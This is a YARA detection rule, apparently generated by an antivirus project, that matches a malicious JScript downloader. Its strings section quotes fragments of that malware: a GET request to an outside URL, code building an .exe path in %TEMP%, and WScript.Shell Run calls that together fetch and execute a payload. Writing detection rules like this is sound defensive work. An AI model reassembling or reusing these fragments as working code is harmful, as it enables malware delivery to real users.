rule sig_20160329_3a3e49a29e78a29aebacfbd1635406d8 {
  meta:
    description = "datamaliciousorder - file 20160329_3a3e49a29e78a29aebacfbd1635406d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "59bcc202b810c21b4d4c35c8e1d190347751716677fb43a6e12bbd299bc081a0"

  strings:
    $s1  = "x0[N](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function dF() {return I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uCQPgBy75cDCyF.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Qp](jP() * 11); if (x0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function k(NJ, j){JD = JD * 1; return NJ - j;};" fullword ascii
    $s5  = "var I = function t() {return WScript[R](\"WScript.Shell\");}(), U = 11;" fullword ascii
    $s6  = "function TA(){return \"\" + M;};" fullword ascii
    $s7  = "function lF(ww){I[\"Run\"](ww, JD, JD);};" fullword ascii
    $s8  = "function E() {return ((B == true) && (B == jc)) ? 1 : JD;};" fullword ascii
    $s9  = "function kQ(){return R;};" fullword ascii
    $s10 = " while (X){" fullword ascii
    $s11 = "return k(T, Y);" fullword ascii
    $s12 = "var X1 = new this[\"Date\"]();" fullword ascii
    $s13 = "function kI()" fullword ascii
    $s14 = "function dC(xK) {var q = (1, 2, 3, 4, 5, xK); return q;};" fullword ascii
    $s15 = "function jP(){return 22;};" fullword ascii
    $s16 = "var B = false;" fullword ascii
    $s17 = "var f = false;" fullword ascii
    $s18 = "jc = true; " fullword ascii
    $s19 = "var jc = false;" fullword ascii
    $s20 = "B = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}